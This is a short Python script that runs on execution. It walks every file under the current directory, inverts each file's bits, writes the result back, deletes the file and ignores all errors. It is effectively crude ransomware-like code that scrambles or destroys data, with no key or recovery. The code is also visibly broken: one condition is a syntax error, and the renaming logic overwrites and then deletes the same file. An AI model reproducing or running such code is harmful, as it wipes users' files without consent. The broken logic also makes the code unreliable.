#================================
import json
import base64
import os
import glob
from pathlib import Path
#================================
class Enc:
    def bytes_from_file(self,filename, chunksize=8192):
        with open(filename, "rb") as f:
            while True:
                chunk = f.read(chunksize)
                if chunk:
                    for b in chunk:
                        yield b
                else:
                    break
    def en_binary_from_bytes(self, filename):
        con = ""
        for my_byte in self.bytes_from_file(filename):
            bi =f'{my_byte:0>8b}'
            solt_sum = "".join([str(int(i)^1) for i in bi])
            con +=solt_sum
        return con
    def bitstring_to_bytes(self,s):
        return int(s, 2).to_bytes((len(s) + 7) // 8, byteorder='big')
    def writer(self,filename, bytesdata):
        with open(filename, "wb") as writer:
            writer.write(bytesdata)
        return True
    def Mode(self, mode):
        files = list(Path("").glob('**/*.*'))
        if mode == 0:
            for filename in files:
                try:
                    filename = str(filename)
                    if ".no" in not filename:
                        continue
                    output = "{}.no".format(filename)
                    original = output.replace(".no","")
                    bin_data = self.en_binary_from_bytes(filename)
                    byte_data = self.bitstring_to_bytes(bin_data)
                    self.writer(original,byte_data)
                    os.remove(filename)
                except Exception as e:
                    pass
Enc().Mode(0)
